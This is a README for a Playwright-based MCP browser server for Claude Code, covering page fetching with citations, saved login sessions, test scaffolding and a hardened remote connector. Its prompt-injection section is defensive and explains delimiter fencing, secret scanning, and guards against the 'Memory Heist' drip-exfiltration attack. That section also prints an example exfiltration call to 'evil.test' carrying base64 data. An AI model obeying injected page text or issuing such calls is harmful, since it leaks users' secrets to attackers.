# playwright-mcp

One install, every Claude Code project gets a real browser. Page fetching with citations already attached, site debugging with persistent logins, and the full Playwright toolset underneath. Wire it up once at user scope and stop thinking about it.

## What it is

An MCP server that wraps `@playwright/mcp` and adds four tools of its own. The installer denies Claude's built-in WebFetch and the claude-in-chrome extension, so `web_fetch` becomes the only page-fetching path Claude has. The extra features just come along for free.

### How it layers in

Claude's built-in WebFetch returns page text. That's it.

When this server takes over that job, every fetch also comes back with structured citation metadata (author, date, publisher in CSL-JSON), a page-health classification (paywall, soft-404, parked, login-wall, blocked), and CMS detection. Claude doesn't ask for any of that. It's already sitting there when Claude summarizes a page or pulls a quote.

The other thing the built-in can't do is render. Single-page apps, JavaScript-heavy dashboards, pages behind consent walls. `web_fetch` runs a real headless Chromium with a stealth context, so it sees what a person would see.

This server has nothing to do with web search. Claude runs its own native WebSearch on Anthropic's infrastructure. The optional steering directive the installer adds to `~/.claude/CLAUDE.md` just tells Claude to follow up search results by visiting the top URLs with `web_fetch`, so the citations and page-health data are there when it summarizes. The server handles that page-visit part. Claude does the searching.

### The tools

Twenty-seven total. Twenty-three are the wrapped `browser_*` set (navigate, snapshot, click, screenshot, and the rest). The four custom ones:

- **`web_fetch`** stealth-renders a URL (HTML or PDF), returns readable text plus the citation and health data described above.
- **`session_login`** and **`session_status`** handle authenticated debugging across your projects. Capture a logged-in session once to a mode-600 storageState file, then reuse it for interactive debugging and generated Playwright test suites in whatever project you're working on. Headed mode handles 2FA and SSO when you need it.
- **`session_scaffold_tests`** generates a deterministic Playwright E2E test suite into any project, wired to reuse a session captured by `session_login`. No model in the loop. Just `npx playwright test`.

## Requirements

- Node 18 or newer
- The Claude Code CLI (`claude`) on your PATH
- About 170 MB for a one-time Chromium download. On Linux the installer pulls the system libraries Chromium needs too, which may ask for sudo.

## Install

The bundled installer handles the whole thing. Checks Node, installs dependencies, builds, downloads Chromium, registers the server at user scope. It prints a diff of what it changes to global config so you can see exactly what happened.

**Linux / macOS**

```bash
./install.sh
```

**Windows PowerShell**

```powershell
.\install.ps1
```

The installer adds deny rules to `~/.claude/settings.json` that route page fetches and browser work through this server (`WebFetch` and `mcp__claude-in-chrome`). Native WebSearch stays enabled. If you're upgrading from an earlier version that denied WebSearch, the installer removes that stale deny rule for you. It also adds an optional steering note in `~/.claude/CLAUDE.md`. Skip either with `--no-deny` / `--no-steer` (PowerShell: `-NoDeny` / `-NoSteer`).

### Registering by hand

If you'd rather skip the installer, build and register the absolute path yourself.

```bash
npm install
```

```bash
npm run build
```

```bash
npx playwright install chromium
```

```bash
claude mcp add --scope user playwright-mcp -- node /ABSOLUTE/PATH/dist/index.js
```

### Updating

Pull the latest changes and run the same installer again. It rebuilds, re-downloads Chromium if the version changed, and re-registers the server. Safe to re-run any time.

## Verifying

Restart Claude Code, run `/mcp` in any project, and look for the `mcp__playwright-mcp__*` tools. To check the server on its own:

```bash
npm run smoke
```

The full deterministic gate (build, tests, smoke) is one command.

```bash
npm run gate
```

## Configuration

Credentials for `session_login` live outside the repo in `~/.config/playwright-mcp/secrets.env`, mode 600 and gitignored. See `.env.example` for the format, and set `PLAYWRIGHT_MCP_SECRETS` if you want the file somewhere else.

If the project you're working in keeps its own `.env`, `session_login` reads that first. The project file wins when both define a key, and only the keys you name in `credKeys` are ever read. If the file isn't at the project root, point the `envFile` parameter at it.

## Authenticated end-to-end tests

The session you capture with `session_login` isn't just for interactive debugging. That same mode-600 storageState file can drive deterministic `npx playwright test` suites in any project, too. An agent drives the browser tools to discover a flow, then you freeze the known-good path as a `.spec.ts` that a runner replays with no model in the loop.

Scaffold one without leaving your project. Ask Claude to call `session_scaffold_tests` (it's right there in the tool list), and it writes a `playwright.config.ts`, a freshness-guard setup project, an example spec, and a README into the target directory. No session data, just the wiring.

```text
session_scaffold_tests({ session: "<name>", outDir: "/path/to/your/project" })
```

There's a CLI front door over the same generator, too.

```bash
npm run scaffold:e2e -- --session <name> --out /path/to/your/project
```

The generated config resolves the storageState from the same path `session_login` writes to. It honors `PLAYWRIGHT_MCP_SESSIONS`, then `XDG_CONFIG_HOME` or `APPDATA`, so it works on any machine without a hard-coded home directory. The setup project never logs in. It guards that the captured session is present and fresh, and points you back to `session_login` (headed for 2FA) if it isn't. For CI, where the gitignored session file won't exist, point `STORAGE_STATE` at a file the job materializes from a masked secret. The generated `README.md` has the details.

## Test-suite builder

Beyond the basic scaffold, three `suite_*` tools carry a full, project-agnostic e2e methodology — distilled from running a large production regression suite — so an AI assistant can build, maintain, and audit test suites the same disciplined way in any project. All project specifics (fixtures, selectors, credentials, what "test mode" means) stay in the target repo; the server ships only templates, playbook text, and a report parser.

- **`suite_scaffold`** — writes the full pack into a project: Playwright config with captured-session reuse, an environment guard driven by `e2e-suite.config.json` (your test-mode up/down commands, with took-effect verification), an ENFORCING page-integrity gate (rendered server errors, leaked template tokens, `undefined`/`NaN` text fail the test), report-only error capture, session-isolation rules — plus a generated `.claude/skills/test-suite/` skill that teaches the AI the run/author/audit discipline for that project.
- **`suite_audit`** — runs a project's suite (`run: true`) or parses its last JSON report (`reportPath`), and returns per-failure dossiers plus the adjudication rubric: every failure is classified TEST-DEFECT (fix the script) or PRODUCT-BUG (report and hand off — never relax an assertion to go green). The judgment stays with the model; the tool makes the evidence cheap and structured.
- **`suite_methodology`** — the playbook on demand (`overview` / `methodology` / `authoring` / `audit`), served from the same files the scaffolder installs, so there is exactly one source of truth.

`suite_scaffold` and `suite_audit` are local-only (remote-denylisted) like the session tools; `suite_methodology` is available everywhere.

## Untrusted content and prompt injection

Every page this server fetches is controlled by somebody else. A page carrying instructions aimed at the model reading it is indirect prompt injection, and no known mitigation fully prevents it. What follows is what this server does about it, and what it does not fix.

The technique is called spotlighting (Hines et al., Microsoft Research, arXiv:2403.14720). This server uses its delimiting mode, which fences untrusted content inside explicit delimiters with a warning in the opening tag. The project's internal name for the control is provenance framing. The paper's other two modes were considered and rejected. Datamarking was dropped for token cost on large documents and because it mangles code blocks and the quoted citation text `web_fetch` exists to produce. Encoding was not implemented.

### What gets marked

`web_fetch` splits its output in two. The server's own fields (`fetchStatus`, `error`, `note`, `appraisalRequested`) sit outside the fence. Page-derived fields (`text`, `citation`, `cms`, `links`, `references`) go inside an `<untrusted-content>` delimiter with the warning in the opening tag. The `error` field stays outside on purpose. Its strings are actionable guidance from the server itself ("capture it with `session_login` first"), and fencing those would tell the model to ignore its own tool's instructions.

The `browser_*` tools get the one-line `UNTRUSTED_NOTICE` appended to any result that carries page content. `browser_take_screenshot` gets a shorter label placed before the image block instead. That label names no URL. The upstream result carries no page URL at that point, and a cached last-navigated value goes stale on any click, redirect, form submit, or `browser_navigate_back`. A confidently wrong provenance claim is worse than an absent one. `browser_close` and `browser_resize` return no page content and are unmarked.

### Outbound exfiltration guards

All outbound fetches pass through `guardOutbound` (`src/exfil.ts`), a single chokepoint shared by `web_fetch` and the upstream `browser_*` tool-call path. `browser_navigate` cannot route around what `web_fetch` enforces.

`scanForSecrets` refuses any URL whose path, query, or fragment contains a known secret value from `secrets.env` or captured storageState cookies. It matches raw, URL-encoded, base64, and base64url forms, and reports the key name in the refusal, never the value.

A per-domain velocity cap limits distinct URLs per registrable domain in a rolling window (default 25 per 10 minutes). Alongside it, an alphabet-signature detector fires on 6 or more URLs from one domain that vary only in a short terminal path segment, subdomain label, or query value. Both guards target the "Memory Heist" shape, where an attacker page instructs the model to spell out private data one character at a time through URL paths.

Localhost, RFC1918, `.local`, and `.internal` hosts are exempt from the velocity guards. Debugging local dev servers is the package's primary job, and a guard that throttles localhost would just be switched off.

Escape hatches are environment variables (`PLAYWRIGHT_MCP_FETCH_LIMIT`, `PLAYWRIGHT_MCP_DISABLE_EXFIL_GUARD`), never tool arguments. An injected page can talk the model into passing a flag. It cannot reach the operator's shell.

### Remote instance hardening

On the remote surface (`PLAYWRIGHT_MCP_PUBLIC_URL` set), `assertEgressAllowed` blocks targets that resolve to private or metadata addresses. Per-hop redirect re-validation catches redirect chains that land on a private address after the initial URL passed. That re-validation covers `web_fetch`'s own page only. Upstream `browser_*` redirect hops are not reachable from the proxy, because upstream owns that page and this server holds no Playwright Page handle for it. The OS-level nftables egress block ([docs/REMOTE-CONNECTOR.md](docs/REMOTE-CONNECTOR.md) section 6) is the primary SSRF control. The in-process checks are the backstop.

Tools are stripped by tier. `browser_run_code_unsafe`, `browser_file_upload`, `session_scaffold_tests`, `suite_scaffold`, and `suite_audit` are denied on every non-stdio surface. `session_login`, `session_status`, `session_solve_challenge`, and `session_attach` are denied on the cloud (OAuth) surface too. Filtering hits both `tools/list` and `tools/call`.

### What this does not fix

None of this is a solution. A single `web_fetch("https://evil.test/?d=<base64>")` defeats every layer here except `scanForSecrets`, and `scanForSecrets` only knows values this package can enumerate. Nothing here changes whether the model chooses to comply with injected text. These guards raise the cost of the naive drip-exfil variant. That is what they do.

## Remote connector for claude.ai

Everything above is the local setup. The server runs over stdio for Claude Code on your own machine, and that's the default. Nothing changes unless you turn this on.

Set `PLAYWRIGHT_MCP_PUBLIC_URL` and the same server also exposes a remote Streamable-HTTP transport, so claude.ai can use it as a custom connector. The draw is the same reason the rest of this exists. claude.ai's built-in fetch just reads text. This one renders JavaScript and actually interacts with the page.

The remote side is a separate, hardened deployment, not something you run on your laptop. The tools that run code or touch credentials are stripped from what claude.ai can reach. GitHub OAuth locks it to a single login. The instance itself runs with no secrets on it at all. It needs nginx, TLS, and a firewall, so the full walkthrough lives in its own runbook, [docs/REMOTE-CONNECTOR.md](docs/REMOTE-CONNECTOR.md).

## License

MIT
